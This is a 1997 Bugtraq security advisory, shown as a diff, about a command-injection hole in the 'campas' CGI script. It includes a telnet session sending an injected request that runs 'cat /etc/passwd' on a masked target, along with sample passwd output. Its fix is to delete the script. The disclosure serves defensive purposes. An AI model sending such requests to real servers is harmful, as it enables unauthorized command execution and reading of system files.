@@ -1,0 +1,50 @@
+                               campus cgi hole
+
+Description: A hole very similar to the standard phf hole alows people to
+execute arbitrary commands through the campus cgi.
+Author: Francisco Torres <ftorres@CASTOR.JAVERIANA.EDU.CO>
+Compromise: Execute arbitrary commands remotely as the owner of the
+cgi-running process (commonly nobody or daemon).
+Vulnerable Systems: Those running a vulnerable version of the campus cgi.
+Version 1.2 is vulnerable. It may be distributed with the NCSA server.
+Date: 15 July 1997
+
+Date: Tue, 15 Jul 1997 18:24:31 -0500
+From: Francisco Torres <ftorres@CASTOR.JAVERIANA.EDU.CO>
+To: BUGTRAQ@NETSPACE.ORG
+Subject: Bug CGI campas
+
+CAMPAS SECURITY BUG
+-------------------
+        ET Lownoise Colombia 1997
+
+CGI:    campas
+        #!/bin/sh
+        #pragma ident "@(#)campas.sh    1.2 95/05/24 NCSA"
+
+Impact: Execute commands
+
+Exploit:
+> telnet www.xxxx.net 80
+Trying 200.xx.xx.xx...
+Connected to venus.xxxx.net
+Escape character is '^]'.
+GET /cgi-bin/campas?%0acat%0a/etc/passwd%0a
+<PRE>
+root:x:0:1:Super-User:/export/home/root:/sbin/sh
+daemon:x:1:1::/:
+bin:x:2:2::/usr/bin:
+sys:x:3:3::/:
+adm:x:4:4:Admin:/var/adm:
+lp:x:71:8:Line Printer Admin:/usr/spool/lp:
+smtp:x:0:0:Mail Daemon User:/:/bin/false
+.... continue :P
+
+Solution: 1-If u dont use it erase it.!
+          2-Dont use it again.. (go point 1)
+
+Well another line to put in vito.ini.
+
+ET LOwnoise 1997 Colombia
+
+Addendum(if any):
